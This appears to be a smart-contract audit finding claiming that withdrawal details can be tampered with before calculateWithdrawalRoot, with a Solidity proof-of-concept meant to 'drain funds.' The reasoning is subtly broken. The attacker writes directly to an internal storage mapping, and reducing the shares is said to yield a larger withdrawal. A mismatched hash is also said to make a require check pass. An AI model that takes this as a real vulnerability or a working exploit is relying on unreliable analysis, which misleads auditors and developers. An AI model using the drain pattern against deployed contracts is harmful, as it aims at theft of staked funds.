Manipulation Withdrawal details/roots could be tampered with calculateWithdrawalRoot No verification of calculated roots An attacker could manipulate withdrawal details before calculating the root hash, causing it to no longer match the stored root and enabling fraudulent withdrawals.

#proof of concept 

Here is a proof of concept for manipulating withdrawal details to enable fraudulent transactions:

address depositor = 0xabc123...; // address of victim staker
address strategy = 0xdef456...; // address of a strategy the staker uses

QueuedWithdrawal memory withdrawal = QueuedWithdrawal(
[strategy], // strategies
[10000], // shares
depositor, // depositor
WithdrawerAndNonce(msg.sender, 0), // withdrawer and nonce
block.number, // withdrawal start block
address(this) // delegatedAddress
);

bytes32 root = calculateWithdrawalRoot(withdrawal); // calculate the initial root

// manipulation begins - reduce the number of shares
withdrawal.shares[0] = 5000;

bytes32 manipulatedRoot = calculateWithdrawalRoot(withdrawal); // calculate root with modified details

// store the modified (invalid) root
withdrawalRootPending[manipulatedRoot] = true;

// now the invalid root is recorded, the attacker can withdraw more than intended
_completeQueuedWithdrawal(withdrawal, [token(strategy)], 0, true);

// repeat withdraw calls as needed to drain funds

This proof of concept demonstrates how an attacker could manipulate withdrawal details before calculating and storing the root hash.
By reducing the number of shares after calculating the initial root, the new root hash would no longer match the stored hash, causing the require check to pass on subsequent calls.
This would allow the attacker to complete fraudulent withdrawals for more than the intended amount.

The attacker is able to withdraw excess funds due to the lack of verification on the calculated root hash. Simply storing and comparing hashes does not actually validate the withdrawal details, enabling this manipulation.